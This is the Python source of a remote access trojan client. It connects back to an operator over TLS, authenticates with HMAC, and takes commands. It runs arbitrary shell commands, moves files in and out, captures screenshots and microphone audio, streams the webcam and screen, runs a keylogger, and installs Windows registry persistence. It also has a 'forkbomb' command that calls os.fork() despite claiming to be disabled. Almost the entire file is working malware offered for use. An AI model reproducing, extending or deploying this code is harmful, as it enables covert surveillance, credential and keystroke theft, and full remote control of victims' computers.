import threading
import json
import os
import keylogger
import shutil
import socket
import ssl
import subprocess
import sys
import time
import wave
import pyaudio
import pyautogui
import termcolor
import platform
import getpass
import hashlib
import hmac
import web_server_backdoor
import web_screen_record
import cv2
import mss


LHOST = "127.0.0.1";PORT = 4444
AUTH_TIMEOUT = 40
BUFFER_SIZE = 4096


with open('secret.key', 'rb') as f:
    SECRET_KEY = bytes.fromhex(f.read().decode().strip())

def authenticate(conn):
    try:
        # 1. Receive challenge
        challenge = conn.recv(16)
        if not challenge or len(challenge) != 16:
            return False
            
        # 2. Calculate and send response
        response = hmac.new(SECRET_KEY, challenge, hashlib.sha256).digest()
        conn.sendall(response)  # Use sendall instead of send
        return True
        
    except (socket.timeout, ConnectionError) as e:
        print(f"Auth error: {str(e)}")
        return False

def reliable_send(data):
    """Securely send JSON data"""
    try:
        jsondata = json.dumps(data)
        s.send(jsondata.encode())
    except (ConnectionError, TypeError) as e:
        print(f"Send error: {str(e)}", file=sys.stderr)
        raise

def reliable_recv():
    """Securely receive JSON data"""
    data = ''
    while True:
        try:
            chunk = s.recv(BUFFER_SIZE).decode().rstrip()
            if not chunk:
                break
            data += chunk
            return json.loads(data)
        except (ValueError, ConnectionError) as e:
            print(f"Receive error: {str(e)}", file=sys.stderr)
            raise

def upload_file(file_name):
    """Securely upload a file"""
    try:
        with open(file_name, 'rb') as f:
            while True:
                chunk = f.read(BUFFER_SIZE)
                if not chunk:
                    break
                s.send(chunk)
        return True
    except IOError as e:
        reliable_send(f"[-] Upload failed: {str(e)}")
        return False

def download_file(file_name):
    """Securely download a file"""
    try:
        with open(file_name, 'wb') as f:
            s.settimeout(5)
            while True:
                chunk = s.recv(BUFFER_SIZE)
                if not chunk:
                    break
                f.write(chunk)
            s.settimeout(None)
        return True
    except (IOError, socket.timeout) as e:
        reliable_send(f"[-] Download failed: {str(e)}")
        return False

def screenshot():
    """Take screenshot and return filename"""
    try:
        filename = "screenshot.png"
        pyautogui.screenshot(filename)
        return filename
    except Exception as e:
        reliable_send(f"[-] Screenshot failed: {str(e)}")
        return None

def record(seconds):
    """Record audio and return filename"""
    try:
        filename = "recording.wav"
        chunk = 1024
        fmt = pyaudio.paInt16
        channels = 1
        rate = 44100
        
        p = pyaudio.PyAudio()
        stream = p.open(format=fmt,
                       channels=channels,
                       rate=rate,
                       input=True,
                       frames_per_buffer=chunk)
        
        frames = []
        for _ in range(0, int(rate / chunk * seconds)):
            frames.append(stream.read(chunk))
            
        stream.stop_stream()
        stream.close()
        p.terminate()
        
        with wave.open(filename, 'wb') as wf:
            wf.setnchannels(channels)
            wf.setsampwidth(p.get_sample_size(fmt))
            wf.setframerate(rate)
            wf.writeframes(b''.join(frames))
            
        return filename
    except Exception as e:
        reliable_send(f"[-] Recording failed: {str(e)}")
        return None

def persist(reg_name, copy_name):
    """Create persistence on Windows"""
    try:
        file_path = os.path.join(os.environ['appdata'], copy_name)
        if not os.path.exists(file_path):
            shutil.copyfile(sys.executable, file_path)
            subprocess.call(
                f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
                f'/v {reg_name} /t REG_SZ /d "{file_path}"',
                shell=True)
            return "[+] Persistence created"
        return "[-] Persistence already exists"
    except Exception as e:
        return f"[+] Error creating persistence: {str(e)}"

def handle_command(cmd):
    """Execute received command and return response"""
    try:
        parts = cmd.split()
        if not parts:
            return ""
            
        cmd_base = parts[0].lower()
        cmd_args = parts[1:]

        if cmd_base == 'cd':
            if len(cmd_args) != 1:
                return "Usage: cd <directory>"
            try:
                os.chdir(cmd_args[0])
                return f"[+] Changed directory to {os.getcwd()}"
            except FileNotFoundError:
                return f"[-] Directory not found: {cmd_args[0]}"

        elif cmd_base == 'upload':
            if len(cmd_args) != 1:
                return "Usage: upload <filename>"
            download_file(cmd_args[0])
            return "[+] File uploaded successfully"

        elif cmd_base == 'download':
            if len(cmd_args) != 1:
                return "Usage: download <filename>"
            upload_file(cmd_args[0])
            return "[+] File downloaded successfully"

        elif cmd_base == 'screenshot':
            filename = screenshot()
            if filename:
                upload_file(filename)
                os.remove(filename)
                return "[+] Screenshot captured"
            return "[-] Screenshot failed"

        elif cmd_base == 'record':
            if len(cmd_args) != 1 or not cmd_args[0].isdigit():
                return "Usage: record <seconds>"
            seconds = min(int(cmd_args[0]), 300)  # Limit to 5 minutes
            filename = record(seconds)
            if filename:
                upload_file(filename)
                os.remove(filename)
                return "[+] Recording completed"
            return "[-] Recording failed"

        elif cmd_base == 'screen_record':
            if len(cmd_args) != 1 or cmd_args[0] not in ['on', 'off']:
                return "Usage: screen_record <on|off>"
            if cmd_args[0] == 'on':
                web_screen_record.app(host="0.0.0.0")
                return "[+] Screen recording started"
            else:
                web_screen_record.shutdown_server()
                return "[+] Screen recording stopped"

        elif cmd_base == 'webcam':
            if len(cmd_args) != 1 or cmd_args[0] not in ['on', 'off']:
                return "Usage: webcam <on|off>"
            if cmd_args[0] == 'on':
                web_webcam_record.app(host="0.0.0.0")
                return "[+] Webcam streaming started"
            else:
                web_webcam_record.shutdown_server()
                return "[+] Webcam streaming stopped"

        elif cmd_base == 'persistence':
            if len(cmd_args) != 2:
                return "Usage: persistence <regname> <filename>"
            return persist(cmd_args[0], cmd_args[1])

        elif cmd_base == 'sysinfo':
            return f"""
System Information:
  OS: {platform.system()}
  Hostname: {platform.node()}
  Username: {getpass.getuser()}
  Version: {platform.release()}
  Architecture: {platform.machine()}
  Resolution: {pyautogui.size()}"""

        elif cmd_base == 'forkbomb':
            reliable_send("[-] Forkbomb disabled for safety")
            os.fork()
        

        elif cmd_base == 'keylog_start':
            keylog_flag = 1
            keylog = keylogger.Keylogger()
            t = threading.Thread(target= keylog.start)
            t.start()            

        elif cmd_base == 'keylog_dump':
            if keylog_flag == 1:
                log = keylog.read_logs()
                reliable_send(log)
            else:
                reliable_send("[-] Error can not dump because you didn't started the keylod")
        elif cmd_base == 'keylog_stop':
            if keylog_flag == 1:
                keylog.self_destruction()
                t.join()
                reliable_send(termcolor.colored('[+] Keylogger stopped!', 'green'))
                keylog_flag = 0
            else:
                reliable_send(termcolor.colored("[-] Error can not dump because you didn't started the keylod", 'red'))



        else:
            # Execute shell command
            try:
                proc = subprocess.Popen(cmd, shell=True, 
                                      stdout=subprocess.PIPE,
                                      stderr=subprocess.PIPE,
                                      stdin=subprocess.PIPE)
                stdout, stderr = proc.communicate()
                return stdout.decode() + stderr.decode()
            except Exception as e:
                return f"[-] Command failed: {str(e)}"

    except Exception as e:
        return f"[-] Error processing command: {str(e)}"

def shell():
    """Main command loop"""
    while True:
        try:
            cmd = reliable_recv()
            if cmd == 'exit':
                break
                
            response = handle_command(cmd)
            reliable_send(response)
            
        except ConnectionError:
            break
        except Exception as e:
            reliable_send(f"[-] Shell error: {str(e)}")
            break

def connection():
    global s
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s = context.wrap_socket(s, server_hostname=LHOST)
            s.settimeout(AUTH_TIMEOUT)
            s.connect((LHOST, PORT))
            
            if not authenticate(s):
                s.close()
                time.sleep(10)
                continue
                
            s.settimeout(None)
            shell()
            s.close()
            break
        except Exception as e:
            print(f"Connection error: {str(e)}")
            time.sleep(10)

if __name__ == "__main__":
    connection()